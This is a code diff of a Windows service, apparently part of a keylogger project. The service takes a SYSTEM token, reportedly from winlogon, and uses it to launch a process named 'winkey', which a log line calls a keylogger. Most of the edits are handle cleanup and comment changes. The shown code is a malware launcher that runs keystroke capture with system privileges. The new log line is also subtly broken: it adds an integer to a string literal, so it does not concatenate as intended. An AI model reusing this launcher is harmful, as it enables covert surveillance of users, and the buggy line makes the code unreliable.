@@ -125,16 +125,13 @@ void LogEvent(const std::wstring &message)
 
 //
 // Purpose:
-//   The service code
+//   The service code, it is the main thread !
 //
 // Parameters:
 //   dwArgc - Number of arguments in the lpszArgv array
 //   lpszArgv - Array of strings. The first string is the name of
 //     the service and subsequent strings are passed by the process
 //     that called the StartService function to start the service.
-//
-// Return value:
-//   None
 //
 VOID SvcInit(DWORD dwArgc, LPWSTR *lpszArgv)
 {
@@ -185,6 +182,8 @@ VOID SvcInit(DWORD dwArgc, LPWSTR *lpszArgv)
     {
         LogEvent(L"Failed to get SYSTEM token");
         ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
+        CloseHandle(ghSvcStopEvent);
+        ghSvcStopEvent = nullptr;
         return;
     }
 
@@ -210,51 +209,25 @@ VOID SvcInit(DWORD dwArgc, LPWSTR *lpszArgv)
         &pi);
 
     RevertToSelf();
+    CloseHandle(hTokenDup);
     if (bResult == 0)
     {
         LogEvent(L"Failed to create, GetLastError=" + std::to_wstring(GetLastError()));
         // TODO: return ;
     }
     // Save the process handler to kill it when stopping
+    CloseHandle(pi.hThread);
     hwinkey = pi.hProcess;
 
     int counter = 0;
-    // TODO: is this loop really usefull ?
     while (WaitForSingleObject(ghSvcStopEvent, 1000) == WAIT_TIMEOUT)
     {
         counter++;
-        // Check whether to stop the service every 1000ms, reads WAIT_TIMEOUT if no stop
-
-        // guarantees that the following work is executed under the impersonated token
-        // if (!ImpersonateSystem(hTokenDup))
-        //     continue; // failure -> go to next iteration
-
-        // __try and __finally are Windows extensions called SEH (Structured Exception Handling)
-        // they are an equivalent to try catch
-        // __try
-        // {
-        //     // Code under the impersonated token (should be SYSTEM from winlogon)
-        //     counter++;
-        // }
-        // __finally
-        // {
-        //     // It HAS to be done under any circumstancces
-        //     // do we close the handle of TokenDup ?
-        //     RevertToSelf();
-        // }
     }
-    // TODO: kill winkey process
-    // TODO: really need to kill winkey here ?
-    // if (hwinkey != nullptr)
-    // {
-    //     if (TerminateProcess(hwinkey, 0) == 0)
-    //         LogEvent(L"Error while terminating the process winkey!\nGetLastError=" + std::to_wstring(GetLastError()));
-    //     hwinkey = nullptr;
-    // }
-
-    // TODO: remove this logEvent ?
-    LogEvent(L"Service stopped after " + std::to_wstring(counter) + L" seconds");
+    LogEvent(L"=== Keylogger killed after the follozing amount of seconds : " + counter);
     ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
+    CloseHandle(ghSvcStopEvent);
+    ghSvcStopEvent = nullptr;
     return;
 }
 
@@ -301,13 +274,10 @@ VOID ReportSvcStatus(DWORD dwCurrentState,
 //
 // Purpose:
 //   Called by SCM whenever a control code is sent to the service
-//   using the ControlService function.
+//   using the ControlService function. So it can only be called during the WaitForSingleObject loop
 //
 // Parameters:
 //   dwCtrl - control code
-//
-// Return value:
-//   None
 //
 VOID WINAPI SvcCtrlHandler(DWORD dwCtrl)
 {
@@ -320,6 +290,7 @@ VOID WINAPI SvcCtrlHandler(DWORD dwCtrl)
         {
             if (TerminateProcess(hwinkey, 0) == 0)
                 LogEvent(L"Error while terminating the process winkey!\nGetLastError=" + std::to_wstring(GetLastError()));
+            CloseHandle(hwinkey);
             hwinkey = nullptr;
         }
         // Signal the service to stop.
@@ -338,16 +309,12 @@ VOID WINAPI SvcCtrlHandler(DWORD dwCtrl)
 //     the service and subsequent strings are passed by the process
 //     that called the StartService function to start the service.
 //
-// Return value:
-//   None.
-//
 VOID WINAPI SvcMain(DWORD dwArgc, LPWSTR *lpszArgv)
 {
     (void)dwArgc;
     (void)lpszArgv;
 
-    // Register the handler function for the service
-
+    // Register the handler function for the service, SCM takes care of its lifecycle so no manual closing
     gSvcStatusHandle = RegisterServiceCtrlHandlerW(
         SVCNAME,
         SvcCtrlHandler);
@@ -376,6 +343,7 @@ VOID WINAPI SvcMain(DWORD dwArgc, LPWSTR *lpszArgv)
     SvcInit(dwArgc, lpszArgv);
 }
 
+// This function connect the process to the SCM, it says which service has which main function
 // If the function succeeds, the return value is nonzero.
 // If the function fails, the return value is zero. To get extended error information, call GetLastError.
 // The members of the last entry in the table must have NULL values to designate the end of the table.
